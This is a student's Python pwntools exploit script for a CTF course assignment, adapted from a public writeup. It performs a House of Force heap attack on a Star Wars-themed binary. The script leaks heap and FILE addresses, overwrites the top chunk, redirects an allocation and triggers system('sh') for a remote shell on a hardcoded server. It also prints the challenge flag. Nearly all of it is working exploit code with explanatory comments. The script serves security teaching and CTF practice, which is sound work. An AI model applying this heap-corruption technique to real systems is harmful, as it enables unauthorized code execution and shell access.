'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP22: Clone Wars
File Description:  House of Force on a Starwars Binary to obtain a flag

Checksec info:
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   83) Symbols       No    0               4               CloneWarS

File info:
CloneWarS: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a45e46d5347deb6022d64604638a3ed70e8de417, not stripped
'''

# Note this is the answer from the only writeup on the problem. Launched it to see how it would work but worked on disecting it.
# Will not be taking credit for this in the Discord since I didn't solve it by hand. Flag will be written below as proof.
# Initially, we link the correct glibc locally via patheclf and adding our PWD to the dir. Firstly, they find a heap leak which
# will be utilized later to find the base of the heap and correctly predict the next chunk to be malloced. From there, the top
# chunk is overwritten so it will circle back to the start ofthe heap and allocate where we tell it to. From there realize
# that the program leaks the file to call system. Calculate the base of the heap after this, find where the leak is occuring
# to overwrite malloc thus when called next time it will actually be using "system(sh)" to launch a shell.
#
# Original Writeup: https://ctftime.org/writeup/17697
# Flag: ninja{this_was_way_too_much_hassle_to_setup}


# Importing Libaries
from pwn import *
filename = "./CloneWarS"
elf = ELF(filename)
context.arch = 'amd64'

# HElper Functions to traverse menu
def r2d2(n):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'R2? ', b'2')

def pstarships(size, kind, capacity):
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Master, the amount of starships: ', str(size))
    r.sendlineafter(b'What kind of starships?: ', kind)
    r.sendlineafter(b'Capacity of troopers in the starships: ', str(capacity))

def lightsabers(nLs, color):
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendafter(b'How many lightsabers do you think you will need?: ', b'\n')
    r.sendline(str(nLs))
    r.sendafter(b'What color would you like on your light sabers: ', color)

def buildDeathStar(size):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Assemble death star: ',str(size))
    
r = remote("165.22.46.243",8869)    # Address of novocin server

# LEAKING HEAP
pstarships(0x30, 'A', 0x30)
r2d2(-1)
r.recvuntil(b'R2D2 IS .... ')
HEAP_L = int(r.recvregex(r'(\d+) '))

# OVERFLOW TOP_CHUNK
pstarships(0x30, "FF", 0x40) # Overflow Top Chunk

# LEAK FILE PTR
r.sendlineafter(b'Your choice: ', '6')
r.recvuntil(b'File is at: ')
FILE = int(r.recvline().rstrip())

# Calculate Heap base
HEAP = HEAP_L-0x1380 # HEAPBASE
SIZE_OF_LONG = 0x8 # sizeof(long) -> 8 in 64 bits
WILD_OFFSET = 0x12e0 # Current TOP_CHUNK offset

# Calculate next portion of top chunk
TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*4
r.sendlineafter(b'Your choice: ', '1')
buildDeathStar(FILE-TOP_CHUNK) # Calculate the evil size required to write to FILE

# Write sh to pop shell then interactive since malloc will run that cmd and pop shell
r.sendlineafter(b'Your choice: ', '4')
r.sendlineafter(b'What kind of troopers?: ', 'sh') # Modify file with sh
r.sendlineafter(b'Your choice: ', '6') # Trigger system("sh")

# Become interactive to steal secrets
r.interactive()
r.close()